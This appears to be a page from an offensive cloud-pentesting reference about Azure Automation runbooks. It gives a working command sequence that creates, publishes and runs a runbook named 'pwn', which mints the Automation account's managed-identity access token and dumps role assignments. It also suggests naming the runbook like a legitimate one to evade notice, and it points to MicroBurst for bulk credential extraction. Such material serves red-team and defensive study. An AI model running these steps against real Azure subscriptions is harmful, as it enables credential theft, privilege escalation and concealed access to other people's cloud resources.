---
title: "Runbooks: code execution as the Automation account identity"
order: 1
description: "Writing and starting an Automation runbook that runs as the account's identity for arbitrary code execution."
keywords:
  - runbook
  - Automation Account
  - code execution
  - managed identity
  - job
---

# Runbooks

A runbook is a script the Automation Account executes under its **system-assigned managed identity** (or legacy RunAs). With write access to the account, publish a runbook that mints the identity's token or runs arbitrary commands, start it, and read the job output. This is the cleanest arbitrary-code-as-a-privileged-identity primitive in Azure.

## Writing and starting a runbook

```bash
cat > r.ps1 <<'EOF'
Connect-AzAccount -Identity | Out-Null
(Get-AzAccessToken -ResourceUrl "https://management.azure.com/").Token
Get-AzRoleAssignment | Out-String
EOF
az automation runbook create -g <rg> --automation-account-name <aa> -n pwn --type PowerShell
az automation runbook replace-content -g <rg> --automation-account-name <aa> -n pwn --content @r.ps1
az automation runbook publish -g <rg> --automation-account-name <aa> -n pwn
az automation runbook start -g <rg> --automation-account-name <aa> -n pwn
# then read the job output for the token
```

## Exploitation notes

- The token is the Automation Account's managed identity; its role assignments are often Contributor or higher across the subscription.
- `Get-AzPasswords` (MicroBurst) automates publishing a collection runbook and pulling the account's tokens and cleartext assets in one step.
- Jobs and their output are logged in the account; a runbook named like a legitimate one blends in.

## Tools

- **Azure CLI** (`az automation runbook`), **Az PowerShell** (`Connect-AzAccount -Identity`).
- **MicroBurst** (`Get-AzPasswords`): automated runbook-based credential extraction.

## References

- [HackTricks Cloud: Azure Automation runbooks](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI: MicroBurst Get-AzPasswords](https://github.com/NetSPI/MicroBurst)
- [Microsoft: managed identities for Azure Automation](https://learn.microsoft.com/azure/automation/enable-managed-identity-for-automation)
